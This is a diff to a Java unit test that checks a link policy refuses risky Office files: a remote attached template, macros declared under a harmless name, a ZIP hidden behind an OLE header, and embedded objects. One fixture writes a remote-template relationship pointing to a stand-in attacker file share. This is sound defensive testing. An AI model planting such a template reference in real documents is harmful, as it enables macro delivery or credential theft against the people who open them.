@@ -156,6 +156,45 @@ public class LinkPolicyTest {
 		Files.write(ole, new byte[] { (byte) 0xD0, (byte) 0xCF, 0x11, (byte) 0xE0, (byte) 0xA1, (byte) 0xB1, 0x1A,
 				(byte) 0xE1 });
 		assertNull(LinkPolicy.systemProgramTarget(ole.toString(), true));
+		// a hyperlink out of the document is fine, a remote template is not
+		Path links = dir.resolve("links.docx");
+		zipWith(links, "word/_rels/document.xml.rels", "<Relationships><Relationship Id=\"r1\" "
+				+ "Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink\" "
+				+ "Target=\"https://example.com/\" TargetMode=\"External\"/></Relationships>");
+		assertEquals(links.toRealPath().toString(), LinkPolicy.systemProgramTarget(links.toString(), true));
+		Path template = dir.resolve("template.docx");
+		zipWith(template, "word/_rels/settings.xml.rels", "<Relationships><Relationship Id=\"r1\" "
+				+ "Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\" "
+				+ "Target=\"file://attacker/share/t.dotm\" TargetMode=\"External\"/></Relationships>");
+		assertNull(LinkPolicy.systemProgramTarget(template.toString(), true));
+		// macros declared by content type under a harmless name
+		Path declared = dir.resolve("declared.xlsx");
+		try (java.util.zip.ZipOutputStream out = new java.util.zip.ZipOutputStream(Files.newOutputStream(declared))) {
+			out.putNextEntry(new java.util.zip.ZipEntry("[Content_Types].xml"));
+			out.write("<Types><Override PartName=\"/xl/x.bin\" ContentType=\"application/vnd.ms-office.vbaProject\"/></Types>"
+					.getBytes(java.nio.charset.StandardCharsets.UTF_8));
+			out.closeEntry();
+		}
+		assertNull(LinkPolicy.systemProgramTarget(declared.toString(), true));
+		// a ZIP behind something else is not a document Office takes for one
+		Path behind = dir.resolve("behind.xlsx");
+		Files.write(behind, java.util.Arrays.copyOf(new byte[] { (byte) 0xD0, (byte) 0xCF, 0x11, (byte) 0xE0 }, 4));
+		Files.write(behind, Files.readAllBytes(plain), java.nio.file.StandardOpenOption.APPEND);
+		assertNull(LinkPolicy.systemProgramTarget(behind.toString(), true));
+		Path embedded = dir.resolve("embedded.pptx");
+		zip(embedded, "[Content_Types].xml", "ppt/embeddings/oleObject1.bin");
+		assertNull(LinkPolicy.systemProgramTarget(embedded.toString(), true));
+	}
+
+	private static void zipWith(Path file, String name, String text) throws IOException {
+		try (java.util.zip.ZipOutputStream out = new java.util.zip.ZipOutputStream(Files.newOutputStream(file))) {
+			out.putNextEntry(new java.util.zip.ZipEntry("[Content_Types].xml"));
+			out.write('x');
+			out.closeEntry();
+			out.putNextEntry(new java.util.zip.ZipEntry(name));
+			out.write(text.getBytes(java.nio.charset.StandardCharsets.UTF_8));
+			out.closeEntry();
+		}
 	}
 
 	private static void zip(Path file, String... names) throws IOException {
